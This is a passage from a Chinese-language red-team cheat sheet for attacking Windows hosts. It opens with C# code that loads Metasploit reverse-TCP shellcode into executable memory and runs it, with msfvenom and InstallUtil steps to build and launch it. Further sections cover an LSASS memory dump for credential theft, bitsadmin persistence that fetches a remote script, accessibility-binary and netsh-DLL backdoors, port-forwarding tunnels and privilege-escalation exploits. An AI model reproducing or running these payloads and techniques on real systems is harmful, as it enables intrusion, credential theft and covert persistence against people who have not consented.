				// generated with metasploit
                byte[] shellcode = new byte[341] {
0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,
0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,
0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,
0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,
0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,
0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,
0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,
0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,
0x77,0x26,0x07,0x89,0xe8,0xff,0xd0,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,
0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0xc0,0xa8,0x19,0x14,
0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,
0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,
0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x67,
0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,
0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,
0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,
0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x28,0x58,
0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,
0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0x0f,0x85,
0x70,0xff,0xff,0xff,0xe9,0x9b,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc1,
0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 };
	 
				UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode .Length,
									MEM_COMMIT, PAGE_EXECUTE_READWRITE);
				Marshal.Copy(shellcode , 0, (IntPtr)(funcAddr), shellcode .Length);
				IntPtr hThread = IntPtr.Zero;
				UInt32 threadId = 0;
				// prepare data
	 
	 
				IntPtr pinfo = IntPtr.Zero;
	 
				// execute native code
	 
				hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
				WaitForSingleObject(hThread, 0xFFFFFFFF);
	 
		  }
	 
			private static UInt32 MEM_COMMIT = 0x1000;
	 
			private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
	
			[DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
             UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
 
        [DllImport("kernel32")]
        private static extern bool VirtualFree(IntPtr lpAddress,
                              UInt32 dwSize, UInt32 dwFreeType);
 
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(
 
          UInt32 lpThreadAttributes,
          UInt32 dwStackSize,
          UInt32 lpStartAddress,
          IntPtr param,
          UInt32 dwCreationFlags,
          ref UInt32 lpThreadId
 
          );
        [DllImport("kernel32")]
        private static extern bool CloseHandle(IntPtr handle);
 
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(
 
          IntPtr hHandle,
          UInt32 dwMilliseconds
          );
        [DllImport("kernel32")]
        private static extern IntPtr GetModuleHandle(
 
          string moduleName
 
          );
        [DllImport("kernel32")]
        private static extern UInt32 GetProcAddress(
 
          IntPtr hModule,
          string procName
 
          );
        [DllImport("kernel32")]
        private static extern UInt32 LoadLibrary(
 
          string lpFileName
 
          );
        [DllImport("kernel32")]
        private static extern UInt32 GetLastError();
			
	 
		}
```

shellcode部分用msfvenom --payload windows/meterpreter/reverse_tcp lhost=<ip> lport=<port> -f csharp生成替换即可

编译：

> C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /unsafe /platform:x86 /out:C:\test\shell.exe C:\test\InstallUtil-ShellCode.cs

运行：

> C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U C:\test\shell.exe

+ 注意.net版本，2.0测试成功4.0测试失败

### 4.diskshadow

diskshadow.txt

```bash
EXEC C:\windows\system32\notepad.exe
```

执行：

```bash
diskshadow /s diskshadow.txt
```

### 2.klist

### 3.hydra

### 4.lcx

### 5.ms14-068.exe

### 6.nbtscan

内网主机扫描
用法：

>nbtscan -q -r 192.168.1.0/24

### 7.nc

网络管理

### 8.netplwiz

### 9.procdump
ProcDump is a command-line utility whose primary purpose is monitoring an application for CPU spikes and generating crash dumps during a spike that an administrator or developer can use to determine the cause of the spike. ProcDump also includes hung window monitoring (using the same definition of a window hang that Windows and Task Manager use), unhandled exception monitoring and can generate dumps based on the values of system performance counters. It also can serve as a general process dump utility that you can embed in other scripts.
转储进程
用法：

>procdump64.exe -accepteula -ma lsass.exe lsass.dmp

[下载地址](https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump)

### 10.psloggedon
PsLoggedOn is an applet that displays both the locally logged on users and users logged on via resources for either the local computer, or a remote one. 
显示本地登录的用户，以及通过本地计算机或远程计算机的资源登录的用户

>Displays the supported options and the units of measurement used for output values.
>pslogonnegon -

>Shows only local logons instead of both local and network resource logons.
>psloggedon -l

>Don't show logon times.
>psloggedon -x

>computername	Specifies the name of the computer for which to list logon information.
>psloggedon mputername

>If you specify a user name PsLoggedOn searches the network for computers to which that user is logged on. This is useful if you want to ensure that a particular user is not logged on when you are about to change their user profile configuration.
>psloggedon username

[下载地址](https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon)

----------

**权限维持**
***1.bitsadmin***
bitsadmin.exe是windows自带的可用于创建下载或上载作业并监视其进度，bistadmin可以指定下载成功之后要进行什么命令。可绕过autorun、常见杀软检测。

创建任务

> bitsadmin /create backdoor

下载本地文件

> bitsadmin /addfile backdoor %comspec% %temp%\cmd.exe

增加cmd参数，利用regsv技巧，解决命令执行弹框问题

> bitsadmin.exe /SetNotifyCmdLine backdoor regsv*.exe "/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll"

执行任务

> bitsadmin /Resume backdoor

> 列出所有任务
> bitsadmin /list /allusers /verbose

删除某个任务

> bitsadmin /cancel <Job>

删除所有任务

> bitsadmin /reset /allusers

获取任务创建时间

> bitsadmin /GetCreationTime <Job>

## 6.权限维持

### 1.热键替换

#### 1.dxdiag

此工具用于收集有关设备的信息，以帮助解决DirectX声音和视频的问题。
his tool is used to collect info about devices to help troubleshoot problems with DirectX sound and video
[windods自带]

#### 2.sethc.exe

描述：粘滞键

位置：

>C:\Windows\System32\sethc.exe
>C:\Windows\Syswow64\sethc.exe

#### 3.magnify

描述：放大镜

位置：

>C:\Windows\System32\Magnify.exe
>C:\Windows\Syswow64\magnify.exe

#### 4.osk

描述：屏幕键盘

位置：

>C:\Windows\System32\osk.exe
>C:\Windows\Syswow64\osk.exe

#### 5.narrator

描述：屏幕讲述人

位置：

> C:\Windows\System32\narrator.exe

#### 6.displayswitch

描述：显示器设置

位置：

>C:\Windows\System32\displayswitch.exe
>C:\Windows\Syswow64\DisplaySwitch.exe

#### 7.utilman

描述：辅助工具管理器

位置：

>C:\Windows\System32\utilman.exe
>C:\Windows\Syswow64\Utilman.exe

#### 8.dvdplay

描述：DVD播放器

位置：

> C:\Windows\System32\dvdplay.exe
>
> C:\Windows\SysWOW64\dvdplay.exe

### 2.netsh
netsh是windows系统本身提供的功能强大的网络配置命令行工具

>helper dll添加成功后，每次调用netsh，均会加载c:\test\netshtest.dll
>```netsh add helper C:\test\netshtest.dll```

>检测及查杀
>检查：
>检查注册表位置: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh
>通过Process Explorer查看netsh进程加载的dll
>通过Process Monitor查看进程属性Event Properties
>清除：
>```netsh delete helper c:\test\netshtest.dll```
>在HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh删除>对应键值

## 7.端口转发

### 1.Htran

[地址](https://github.com/HiwinCN/HTran)

Linux编译：

> gcc Htran.c -o Htran -lpthread

Windows编译：

> g++ Htran.cpp -o Htran.exe -lpthread -lwsock32

#### 1.将内网端口映射到公网

公网服务器上执行:

> Htran -listen 8888 9999

内网主机执行

> Htran -slave <公网IP> <公网端口> 127.0.0.1 3389

#### 2.将公网流量转发到内网

在公网服务器上执行

> Htran -tran 8888 <内网IP> <目标端口>

### 2.reDuh

[地址](https://github.com/sensepost/reDuh)

### 3.Tunna

[地址](https://github.com/SECFORCE/Tunna)

### 4.ew

[地址](https://github.com/idlefire/ew)

#### 1.开放公网服务器端口

> ./ew -s ssocksd -l 8888

将sock5代理到公网IP的8888端口即可

#### 2.将公网流量代理到内网

在公网服务器上执行

> ./ew -s rcsocks -l 1080 -e 8888

公网服务器反连内网主机

> ./ew -s rsocks -d 192.168.0.2 -e 8888

## 8.权限提升

根据系统信息查找对用利用漏洞

> python windows-exploit-suggester.py --database 2020-08-14-mssb.xls --systeminfo systeminfo.txt

### 1.ms16-075

Windows Vista SP2

Windows Server 2008 SP1

Windows Server 2008 SP2

Windows Server 2008 R2

Windows7 SP1

Windows8.1

Windows Server 2012 Gold

Windows Server 2012 R2

Windows RT8.1

Windows10 Gold

Windows10 1511

> search ms16-075 
>
> use exploit/windows/local/ms16_075_reflection_juicy
>
> set LHOST 10.251.0.105
>
> set LPORT 4444
>
> set session 1
>
> exploit

### 2.CVE-2020-1054

Windows 10 for 32-bit Systems
Windows 10 for x64-based Systems
Windows 10 Version 1607 for 32-bit Systems
Windows 10 Version 1607 for x64-based Systems
Windows 10 Version 1709 for 32-bit Systems
Windows 10 Version 1709 for ARM64-based Systems
Windows 10 Version 1709 for x64-based Systems
Windows 10 Version 1803 for 32-bit Systems
Windows 10 Version 1803 for ARM64-based Systems
Windows 10 Version 1803 for x64-based Systems
Windows 10 Version 1809 for 32-bit Systems
Windows 10 Version 1809 for ARM64-based Systems
Windows 10 Version 1809 for x64-based Systems
Windows 10 Version 1903 for 32-bit Systems
Windows 10 Version 1903 for ARM64-based Systems
Windows 10 Version 1903 for x64-based Systems
Windows 10 Version 1909 for 32-bit Systems
Windows 10 Version 1909 for ARM64-based Systems
Windows 10 Version 1909 for x64-based Systems
Windows 7 for 32-bit Systems Service Pack 1
Windows 7 for x64-based Systems Service Pack 1
Windows 8.1 for 32-bit systems
Windows 8.1 for x64-based systems
Windows RT 8.1
Windows Server 2008 for 32-bit Systems Service Pack 2
Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)
Windows Server 2008 for Itanium-Based Systems Service Pack 2
Windows Server 2008 for x64-based Systems Service Pack 2
Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)
Windows Server 2008 R2 for Itanium-Based Systems Service Pack 1
Windows Server 2008 R2 for x64-based Systems Service Pack 1
Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
Windows Server 2012
Windows Server 2012 (Server Core installation)
Windows Server 2012 R2
Windows Server 2012 R2 (Server Core installation)
Windows Server 2016
Windows Server 2016 (Server Core installation)
Windows Server 2019
Windows Server 2019 (Server Core installation)
Windows Server, version 1803 (Server Core Installation)
Windows Server, version 1903 (Server Core installation)
Windows Server, version 1909 (Server Core installation



https://github.com/0xeb-bp/cve-2020-1054

https://github.com/Iamgublin/CVE-2020-1054

https://github.com/HongYe-Code/CVE-2020-1054

### 3.CVE-2020-0787

Windows 10 for 32-bit Systems
Windows 10 for x64-based Systems
Windows 10 Version 1607 for 32-bit Systems
Windows 10 Version 1607 for x64-based Systems
Windows 10 Version 1709 for 32-bit Systems
Windows 10 Version 1709 for ARM64-based Systems
Windows 10 Version 1709 for x64-based Systems
Windows 10 Version 1803 for 32-bit Systems
Windows 10 Version 1803 for ARM64-based Systems
Windows 10 Version 1803 for x64-based Systems
Windows 10 Version 1809 for 32-bit Systems
Windows 10 Version 1809 for ARM64-based Systems
Windows 10 Version 1809 for x64-based Systems
Windows 10 Version 1903 for 32-bit Systems
Windows 10 Version 1903 for ARM64-based Systems
Windows 10 Version 1903 for x64-based Systems
Windows 10 Version 1909 for 32-bit Systems
Windows 10 Version 1909 for ARM64-based Systems
Windows 10 Version 1909 for x64-based Systems
Windows 7 for 32-bit Systems Service Pack 1
Windows 7 for x64-based Systems Service Pack 1
Windows 8.1 for 32-bit systems
Windows 8.1 for x64-based systems
Windows RT 8.1
Windows Server 2008 for 32-bit Systems Service Pack 2
Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)
Windows Server 2008 for Itanium-Based Systems Service Pack 2
Windows Server 2008 for x64-based Systems Service Pack 2
Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)
Windows Server 2008 R2 for Itanium-Based Systems Service Pack 1
Windows Server 2008 R2 for x64-based Systems Service Pack 1
Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
Windows Server 2012
Windows Server 2012 (Server Core installation)
Windows Server 2012 R2
Windows Server 2012 R2 (Server Core installation)
Windows Server 2016
Windows Server 2016 (Server Core installation)
Windows Server 2019
Windows Server 2019 (Server Core installation)
Windows Server, version 1803 (Server Core Installation)
Windows Server, version 1903 (Server Core installation)
Windows Server, version 1909 (Server Core installation

[CVE-2020-0787.exe](file://./tools/CVE-2020-0787.exe)



### 4.CVE-2019-0803

Microsoft Windows Server 2019 0
Microsoft Windows Server 2016 0
Microsoft Windows Server 2012 R2 0
Microsoft Windows Server 2012 0
Microsoft Windows Server 2008 R2 for x64-based Systems SP1
Microsoft Windows Server 2008 R2 for Itanium-based Systems SP1
Microsoft Windows Server 2008 for x64-based Systems SP2
Microsoft Windows Server 2008 for Itanium-based Systems SP2
Microsoft Windows Server 2008 for 32-bit Systems SP2
Microsoft Windows Server 1803 0
Microsoft Windows Server 1709 0
Microsoft Windows RT 8.1
Microsoft Windows 8.1 for x64-based Systems 0
Microsoft Windows 8.1 for 32-bit Systems 0
Microsoft Windows 7 for x64-based Systems SP1
Microsoft Windows 7 for 32-bit Systems SP1
Microsoft Windows 10 Version 1809 for x64-based Systems 0
Microsoft Windows 10 Version 1809 for ARM64-based Systems 0
Microsoft Windows 10 Version 1809 for 32-bit Systems 0
Microsoft Windows 10 Version 1803 for x64-based Systems 0
Microsoft Windows 10 Version 1803 for ARM64-based Systems 0
Microsoft Windows 10 Version 1803 for 32-bit Systems 0
Microsoft Windows 10 version 1709 for x64-based Systems 0
Microsoft Windows 10 Version 1709 for ARM64-based Systems 0
Microsoft Windows 10 version 1709 for 32-bit Systems 0
Microsoft Windows 10 version 1703 for x64-based Systems 0
Microsoft Windows 10 version 1703 for 32-bit Systems 0
Microsoft Windows 10 Version 1607 for x64-based Systems 0
Microsoft Windows 10 Version 1607 for 32-bit Systems 0
Microsoft Windows 10 for x64-based Systems 0
Microsoft Windows 10 for 32-bit Systems 0

https://github.com/ExpLife0011/CVE-2019-0803/tree/master/win7sp1

### 5.MS16-032

此漏洞影响从Vista到Windows 10的所有Windows版本（包括服务器版本）

[MS16-032](file://./tools/MS16-032)
